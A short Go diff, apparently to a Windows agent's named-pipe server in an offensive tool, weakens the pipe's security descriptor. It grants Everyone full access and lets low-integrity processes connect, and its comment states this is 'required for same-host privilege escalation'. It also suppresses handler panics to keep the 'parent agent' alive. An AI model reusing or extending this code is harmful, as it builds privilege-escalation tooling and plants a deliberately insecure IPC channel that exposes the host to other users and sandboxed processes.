@@ -35,10 +35,13 @@ var (
 )
 
 // pipeSecAttr returns a SECURITY_ATTRIBUTES that grants Everyone full access
-// to the named pipe, enabling cross-machine connections without credential issues.
+// to the named pipe at any integrity level (Low/Medium/High), enabling cross-user
+// and cross-session connections required for same-host privilege escalation.
 func pipeSecAttr() *syscall.SecurityAttributes {
-	// SDDL: D:(A;;0x12019f;;;WD) — grant Everyone (WD) read+write+create_instance
-	sddl, _ := syscall.UTF16PtrFromString("D:(A;;0x12019f;;;WD)")
+	// S:(ML;;NW;;;LW) — SACL mandatory label: allow Low-integrity processes to connect.
+	// D:(A;;0x1f019f;;;WD) — DACL: grant Everyone full pipe access
+	//   (STANDARD_RIGHTS_ALL | pipe-specific bits = read+write+create_instance+sync+delete).
+	sddl, _ := syscall.UTF16PtrFromString("S:(ML;;NW;;;LW)D:(A;;0x1f019f;;;WD)")
 	var sd uintptr
 	procConvertStringSecurityDescriptorToSecurityDescriptorW.Call(
 		uintptr(unsafe.Pointer(sddl)), 1, uintptr(unsafe.Pointer(&sd)), 0)
@@ -209,6 +212,7 @@ func (ps *pipeServer) run() {
 }
 
 func (ps *pipeServer) handleConn(conn *pipeConn) {
+	defer func() { recover() }() // prevent goroutine panic from crashing the parent agent
 	defer conn.Close()
 
 	msg, err := pipeReadMsg(conn)
